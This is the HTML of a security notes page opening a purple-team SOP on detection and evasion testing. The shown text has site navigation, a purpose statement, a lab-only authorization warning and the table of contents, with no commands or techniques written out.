<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-intel-codex docs-version-current docs-doc-page docs-doc-id-Security/Pentesting/sop-detection-evasion-testing" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">Detection &amp; Evasion Testing SOP (Purple Team) | gl0bal01 | Notes &amp; Research</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" property="og:image" content="https://gl0bal01.com/img/lama.jpg"><meta data-rh="true" name="twitter:image" content="https://gl0bal01.com/img/lama.jpg"><meta data-rh="true" property="og:url" content="https://gl0bal01.com/intel-codex/Security/Pentesting/sop-detection-evasion-testing"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="keywords" content="cybersecurity, osint, digital forensics, penetration testing, reverse engineering, malware analysis, AI security, intelligence gathering"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-intel-codex-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-intel-codex-current"><meta data-rh="true" property="og:title" content="Detection &amp; Evasion Testing SOP (Purple Team) | gl0bal01 | Notes &amp; Research"><meta data-rh="true" name="description" content="Bypass security controls: evade AV, EDR, IDS/IPS, firewalls &amp; SIEM detection. Obfuscation, encoding, polymorphism &amp; anti-forensics techniques."><meta data-rh="true" property="og:description" content="Bypass security controls: evade AV, EDR, IDS/IPS, firewalls &amp; SIEM detection. Obfuscation, encoding, polymorphism &amp; anti-forensics techniques."><link data-rh="true" rel="icon" href="/icons/favicon.ico"><link data-rh="true" rel="canonical" href="https://gl0bal01.com/intel-codex/Security/Pentesting/sop-detection-evasion-testing"><link data-rh="true" rel="alternate" href="https://gl0bal01.com/intel-codex/Security/Pentesting/sop-detection-evasion-testing" hreflang="en"><link data-rh="true" rel="alternate" href="https://gl0bal01.com/intel-codex/Security/Pentesting/sop-detection-evasion-testing" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://4X4QPM0QJE-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Security & Analysis","item":"https://gl0bal01.com/intel-codex/category/security--analysis"},{"@type":"ListItem","position":2,"name":"Penetration Testing","item":"https://gl0bal01.com/intel-codex/category/penetration-testing"},{"@type":"ListItem","position":3,"name":"Detection & Evasion Testing SOP (Purple Team)","item":"https://gl0bal01.com/intel-codex/Security/Pentesting/sop-detection-evasion-testing"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="gl0bal01 Blog - Security Research &amp; Human Psychology RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="gl0bal01 Blog - Security Research &amp; Human Psychology Atom Feed">

<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-NFE7MZ9S3P"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-NFE7MZ9S3P",{anonymize_ip:!0})</script>



<link rel="search" type="application/opensearchdescription+xml" title="gl0bal01 | Notes &amp; Research" href="/opensearch.xml">




<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
<link rel="preconnect" href="https://4X4QPM0QJE-dsn.algolia.net" crossorigin="anonymous">
<link rel="preconnect" href="https://www.googletagmanager.com">
<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="dns-prefetch" href="https://fonts.googleapis.com">
<link rel="dns-prefetch" href="https://www.googletagmanager.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Host+Grotesk:wght@600;800&amp;display=swap"><link rel="stylesheet" href="/assets/css/styles.a89a0862.css">
<script src="/assets/js/runtime~main.e6cc6368.js" defer="defer"></script>
<script src="/assets/js/main.48eeb4d3.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/icons/android-icon-48x48.png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/icons/android-icon-48x48.png" alt="gl0bal01" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/icons/android-icon-48x48.png" alt="gl0bal01" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">gl0bal01</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" aria-label="Intel Codex documentation" href="/intel-codex">Intel Codex</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link" aria-label="Practical resources navigation menu">Practical</a><ul class="dropdown__menu"><li><a class="dropdown__link" aria-label="OSINT resources" href="/osint">Osint</a></li><li><a class="dropdown__link" aria-label="Cybersecurity resources" href="/cyber">Cyber</a></li><li><a class="dropdown__link" aria-label="Reverse engineering resources" href="/reverse-engineering">Reverse</a></li><li><a class="dropdown__link" aria-label="AI and machine learning resources" href="/ai">AI</a></li></ul></div><a class="navbar__item navbar__link" aria-label="Security and development cheatsheets" href="/cheatsheets">Cheatsheets</a><a class="navbar__item navbar__link" aria-label="Blog posts and articles" href="/blog">Blog</a><a class="navbar__item navbar__link" aria-label="Latest news and updates" href="/news">News</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/gl0bal01" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link header-github-link" aria-label="GitHub repository"></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search (Meta+k)" aria-keyshortcuts="Meta+k"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="8" stroke="currentColor" fill="none" stroke-width="1.4"></circle><path d="m21 21-4.3-4.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/intel-codex"><span title="Intel Codex Overview" class="linkLabel_WmDU">Intel Codex Overview</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/intel-codex/category/investigations"><span title="Investigations" class="categoryLinkLabel_W154">Investigations</span></a><button aria-label="Collapse sidebar category &#x27;Investigations&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Investigations-Index"><span title="Investigation Index" class="linkLabel_WmDU">Investigation Index</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/intel-codex/category/platform-guides"><span title="Platform Guides" class="categoryLinkLabel_W154">Platform Guides</span></a><button aria-label="Collapse sidebar category &#x27;Platform Guides&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/Platforms-Index"><span title="Platform Investigation SOPs" class="linkLabel_WmDU">Platform Investigation SOPs</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-bluesky"><span title="Bluesky SOP" class="linkLabel_WmDU">Bluesky SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-instagram"><span title="Instagram SOP" class="linkLabel_WmDU">Instagram SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-linkedin"><span title="LinkedIn SOP" class="linkLabel_WmDU">LinkedIn SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-reddit"><span title="Reddit SOP" class="linkLabel_WmDU">Reddit SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-telegram"><span title="Telegram SOP" class="linkLabel_WmDU">Telegram SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-tiktok"><span title="TikTok SOP" class="linkLabel_WmDU">TikTok SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Platforms/sop-platform-twitter-x"><span title="Twitter/X SOP" class="linkLabel_WmDU">Twitter/X SOP</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/intel-codex/category/investigation-techniques"><span title="Investigation Techniques" class="categoryLinkLabel_W154">Investigation Techniques</span></a><button aria-label="Collapse sidebar category &#x27;Investigation Techniques&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/Techniques-Index"><span title="OSINT Investigation Techniques" class="linkLabel_WmDU">OSINT Investigation Techniques</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-collection-log"><span title="OSINT Collection Log &amp; Chain of Custody" class="linkLabel_WmDU">OSINT Collection Log &amp; Chain of Custody</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-entity-dossier"><span title="Entity Dossier Guide" class="linkLabel_WmDU">Entity Dossier Guide</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-financial-aml-osint"><span title="Financial Crime &amp; AML OSINT" class="linkLabel_WmDU">Financial Crime &amp; AML OSINT</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-image-video-osint"><span title="Image &amp; Video OSINT" class="linkLabel_WmDU">Image &amp; Video OSINT</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-legal-ethics"><span title="Legal, Ethics &amp; Data Governance for OSINT" class="linkLabel_WmDU">Legal, Ethics &amp; Data Governance for OSINT</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-opsec-plan"><span title="OPSEC Planning for OSINT Investigations" class="linkLabel_WmDU">OPSEC Planning for OSINT Investigations</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-reporting-packaging-disclosure"><span title="Reporting, Packaging &amp; Disclosure" class="linkLabel_WmDU">Reporting, Packaging &amp; Disclosure</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-sensitive-crime-intake-escalation"><span title="Sensitive Crime Intake &amp; Escalation" class="linkLabel_WmDU">Sensitive Crime Intake &amp; Escalation</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Investigations/Techniques/sop-web-dns-whois-osint"><span title="Web, DNS &amp; WHOIS OSINT" class="linkLabel_WmDU">Web, DNS &amp; WHOIS OSINT</span></a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/intel-codex/category/security--analysis"><span title="Security &amp; Analysis" class="categoryLinkLabel_W154">Security &amp; Analysis</span></a><button aria-label="Collapse sidebar category &#x27;Security &amp; Analysis&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/intel-codex/category/analysis"><span title="Analysis" class="categoryLinkLabel_W154">Analysis</span></a><button aria-label="Collapse sidebar category &#x27;Analysis&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/Analysis-Index"><span title="Security Analysis SOPs" class="linkLabel_WmDU">Security Analysis SOPs</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-ai-vulnerability-evasion"><span title="AI/ML Vulnerability &amp; Evasion Testing SOP" class="linkLabel_WmDU">AI/ML Vulnerability &amp; Evasion Testing SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-cryptography-analysis"><span title="Cryptography Analysis SOP" class="linkLabel_WmDU">Cryptography Analysis SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-forensics-investigation"><span title="Digital Forensics Investigation SOP" class="linkLabel_WmDU">Digital Forensics Investigation SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-hash-generation-methods"><span title="Hash Generation Methods for Evidence Integrity" class="linkLabel_WmDU">Hash Generation Methods for Evidence Integrity</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-malware-analysis"><span title="Malware Analysis SOP" class="linkLabel_WmDU">Malware Analysis SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Analysis/sop-reverse-engineering"><span title="Reverse Engineering" class="linkLabel_WmDU">Reverse Engineering</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/intel-codex/category/penetration-testing"><span title="Penetration Testing" class="categoryLinkLabel_W154">Penetration Testing</span></a><button aria-label="Collapse sidebar category &#x27;Penetration Testing&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/Pentesting-Index"><span title="Pentesting SOPs" class="linkLabel_WmDU">Pentesting SOPs</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-ad-pentest"><span title="Active Directory Pentesting SOP (Authorized)" class="linkLabel_WmDU">Active Directory Pentesting SOP (Authorized)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-bug-bounty"><span title="Bug Bounty Methodology SOP" class="linkLabel_WmDU">Bug Bounty Methodology SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/intel-codex/Security/Pentesting/sop-detection-evasion-testing"><span title="Detection &amp; Evasion Testing SOP (Purple Team)" class="linkLabel_WmDU">Detection &amp; Evasion Testing SOP (Purple Team)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering"><span title="Firmware Reverse Engineering" class="linkLabel_WmDU">Firmware Reverse Engineering</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-linux-pentest"><span title="Linux Pentesting SOP (Authorized)" class="linkLabel_WmDU">Linux Pentesting SOP (Authorized)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-mobile-security"><span title="Mobile Security (iOS &amp; Android)" class="linkLabel_WmDU">Mobile Security (iOS &amp; Android)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-vulnerability-research"><span title="Vulnerability Research SOP" class="linkLabel_WmDU">Vulnerability Research SOP</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Pentesting/sop-web-application-security"><span title="Web Application Security Testing SOP" class="linkLabel_WmDU">Web Application Security Testing SOP</span></a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/intel-codex/Security/Security-Index"><span title="Security Index" class="linkLabel_WmDU">Security Index</span></a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/intel-codex/category/security--analysis"><span>Security &amp; Analysis</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/intel-codex/category/penetration-testing"><span>Penetration Testing</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Detection &amp; Evasion Testing SOP (Purple Team)</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><div class="theme-admonition theme-admonition-danger admonition_xJq3 alert alert--danger"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M5.05.31c.81 2.17.41 3.38-.52 4.31C3.55 5.67 1.98 6.45.9 7.98c-1.45 2.05-1.7 6.53 3.53 7.7-2.2-1.16-2.67-4.52-.3-6.61-.61 2.03.53 3.33 1.94 2.86 1.39-.47 2.3.53 2.27 1.67-.02.78-.31 1.44-1.13 1.81 3.42-.59 4.78-3.42 4.78-5.56 0-2.84-2.53-3.22-1.25-5.61-1.52.13-2.03 1.13-1.89 2.75.09 1.08-1.02 1.8-1.86 1.33-.67-.41-.66-1.19-.06-1.78C8.18 5.31 8.68 2.45 5.05.32L5.03.3l.02.01z"></path></svg></span>Synced from an <strong>Obsidian vault</strong></div><div class="admonitionContent_BuS1"><p>For graph and advanced features, download the <strong>full</strong> <strong><a href="https://github.com/gl0bal01/intel-codex" target="_blank" rel="noopener noreferrer" class="">Intel Codex Vault</a></strong> and open it in <strong>Obsidian</strong>.</p></div></div>
<header><h1>Detection &amp; Evasion Testing SOP (Purple Team)</h1></header>
<blockquote>
<p><strong>Purpose:</strong> Validate detection coverage by simulating adversary techniques in a controlled environment. Test both detection capabilities (blue team) and evasion techniques (red team) to improve security posture.</p>
</blockquote>
<blockquote>
<p><strong>Lab Only:</strong> Never test evasion techniques in production without explicit authorization and coordination.</p>
</blockquote>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="table-of-contents">Table of Contents<a href="#table-of-contents" class="hash-link" aria-label="Direct link to Table of Contents" title="Direct link to Table of Contents" translate="no">​</a></h2>
<ul>
<li class=""><a href="#detection--evasion-testing-sop-purple-team" class="">Detection &amp; Evasion Testing SOP (Purple Team)</a>
<ul>
<li class=""><a href="#table-of-contents" class="">Table of Contents</a></li>
<li class=""><a href="#1-pre-engagement--authorization" class="">1. Pre-Engagement &amp; Authorization</a>
<ul>
<li class=""><a href="#authorization-requirements" class="">Authorization Requirements</a></li>
<li class=""><a href="#lab-environment-requirements" class="">Lab Environment Requirements</a></li>
</ul>
</li>
<li class=""><a href="#2-threat-intelligence--hypothesis-development" class="">2. Threat Intelligence &amp; Hypothesis Development</a>
<ul>
<li class=""><a href="#threat-modeling" class="">Threat Modeling</a></li>
<li class=""><a href="#hypothesis-formulation" class="">Hypothesis Formulation</a></li>
</ul>
</li>
<li class=""><a href="#3-test-planning--scenario-design" class="">3. Test Planning &amp; Scenario Design</a>
<ul>
<li class=""><a href="#control-coverage-matrix" class="">Control Coverage Matrix</a></li>
<li class=""><a href="#success-metrics" class="">Success Metrics</a></li>
<li class=""><a href="#test-scenarios" class="">Test Scenarios</a></li>
</ul>
</li>
<li class=""><a href="#4-adversary-simulation-tools--techniques" class="">4. Adversary Simulation Tools &amp; Techniques</a>
<ul>
<li class=""><a href="#red-team-testing-frameworks" class="">Red Team Testing Frameworks</a></li>
<li class=""><a href="#specific-evasion-techniques-to-test" class="">Specific Evasion Techniques to Test</a></li>
</ul>
</li>
<li class=""><a href="#5-execution--monitoring" class="">5. Execution &amp; Monitoring</a>
<ul>
<li class=""><a href="#execution-protocol" class="">Execution Protocol</a></li>
<li class=""><a href="#data-collection" class="">Data Collection</a></li>
</ul>
</li>
<li class=""><a href="#6-analysis--gap-identification" class="">6. Analysis &amp; Gap Identification</a>
<ul>
<li class=""><a href="#detection-coverage-analysis" class="">Detection Coverage Analysis</a></li>
<li class=""><a href="#false-positive-analysis" class="">False Positive Analysis</a></li>
<li class=""><a href="#evasion-success-tracking" class="">Evasion Success Tracking</a></li>
</ul>
</li>
<li class=""><a href="#7-reporting--improvement" class="">7. Reporting &amp; Improvement</a>
<ul>
<li class=""><a href="#executive-summary-template" class="">Executive Summary Template</a></li>
<li class=""><a href="#improvement-tracking" class="">Improvement Tracking</a></li>
</ul>
</li>
<li class=""><a href="#8-safety--legal" class="">8. Safety &amp; Legal</a>
<ul>
<li class=""><a href="#safety-protocols" class="">Safety Protocols</a></li>
<li class=""><a href="#legal-considerations" class="">Legal Considerations</a></li>
</ul>
